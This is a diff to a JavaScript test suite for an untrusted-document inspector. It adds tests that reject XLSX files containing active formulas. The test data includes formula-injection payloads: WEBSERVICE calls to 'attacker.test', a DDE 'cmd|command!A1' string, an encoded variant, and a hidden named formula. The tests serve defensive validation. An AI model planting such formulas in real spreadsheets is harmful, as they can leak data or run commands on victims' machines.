@@ -90,7 +90,7 @@ describe('untrusted document import',()=>{
       '[Content_Types].xml':strToU8('<Types><Override ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/></Types>'),
       '_rels/.rels':strToU8('<Relationships/>'),
       'xl/workbook.xml':strToU8('<workbook/>'),
-      'xl/worksheets/sheet1.xml':strToU8('<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>Name of bidder</t></is></c><c r="B1"><f>WEBSERVICE("https://attacker.test")</f><v>5</v></c></row></sheetData></worksheet>'),
+      'xl/worksheets/sheet1.xml':strToU8('<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>Name of bidder</t></is></c><c r="B1"><f>SUM(B2:B4)</f><v>5</v></c></row></sheetData></worksheet>'),
     });
     const result=await inspect(bytes,'pricing.xlsx','application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
     expect(result.ok).toBe(true);if(!result.ok)return;
@@ -99,6 +99,26 @@ describe('untrusted document import',()=>{
       {location:'xl/worksheets/sheet1.xml!A1',label:'A1',value:'Name of bidder'},
       {location:'xl/worksheets/sheet1.xml!B1',label:'B1',value:'[Formula retained; not evaluated]'},
     ]);
+  });
+  it.each(['WEBSERVICE("https://attacker.test")','cmd|command!A1','PY("private cloud code")','&#87;EBSERVICE("remote")'])(
+    'rejects an XLSX active formula before it can accompany an export: %s',async formula=>{
+      const bytes=zipSync({
+        '[Content_Types].xml':strToU8('<Types><Override ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/></Types>'),
+        '_rels/.rels':strToU8('<Relationships/>'),'xl/workbook.xml':strToU8('<workbook/>'),
+        'xl/worksheets/sheet1.xml':strToU8('<worksheet><sheetData><row r="1"><c r="A1"><f>'+formula+'</f></c></row></sheetData></worksheet>'),
+      });
+      expect(await inspect(bytes,'pricing.xlsx','application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'))
+        .toEqual({ok:false,code:'DOCUMENT_UNSAFE'});
+    });
+  it('checks workbook named formulas as well as visible worksheet formulas',async()=>{
+    const bytes=zipSync({
+      '[Content_Types].xml':strToU8('<Types><Override ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/></Types>'),
+      '_rels/.rels':strToU8('<Relationships/>'),
+      'xl/workbook.xml':strToU8('<workbook><definedNames><definedName name="HiddenFunction">WEBSERVICE("remote")</definedName></definedNames></workbook>'),
+      'xl/worksheets/sheet1.xml':strToU8('<worksheet><sheetData><row r="1"><c r="A1"><f>HiddenFunction</f></c></row></sheetData></worksheet>'),
+    });
+    expect(await inspect(bytes,'pricing.xlsx','application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'))
+      .toEqual({ok:false,code:'DOCUMENT_UNSAFE'});
   });
   it('extracts PDF AcroForm field names only, leaving flat/scanned text unsupported',async()=>{
     const doc=await PDFDocument.create();const page=doc.addPage();
